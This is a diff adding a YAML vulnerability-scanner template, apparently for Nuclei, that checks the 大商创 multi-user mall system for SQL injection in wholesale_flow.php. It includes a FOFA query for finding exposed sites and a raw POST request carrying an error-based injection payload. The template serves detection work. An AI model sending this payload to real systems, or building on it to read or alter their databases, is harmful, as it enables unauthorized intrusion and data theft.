@@ -1,0 +1,31 @@
+id: dashang-wholesale_flow_php-sql
+
+info:
+  name: "大商创多用户商城系统 wholesale_flow.php 接口 SQL 注入"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="dsc-choie"
+      大商创多用户商城系统在 wholesale_flow.php 接口的参数处理逻辑中存在SQL注入缺陷。攻击者可利用该接口构造恶意SQL请求，绕过身份验证机制，直接对后端数据库执行未经授权的操作，包括数据检索、篡改及删除等行为。该漏洞可能暴露系统存储的敏感业务数据，进一步形成对服务器控制权的威胁。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488286&idx=1&sn=4954f6b45afd6a4fa290d9a750f55162&chksm=c267a62df5102f3b11cde3067744819102965e96a33e227dca4345a956cd823652c36f126bf8&token=350950895&lang=zh_CN#rd
+  tags: 大商创多用户商城系统
+
+http:
+- raw:
+  - |
+    POST /wholesale_flow.php?step=ajax_update_cart HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+
+    rec_ids[]=extractvalue(1,concat(0x7e,md5(123456)))
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '~e10adc3949ba59abbe56e057f20f883'
+
+
+
+
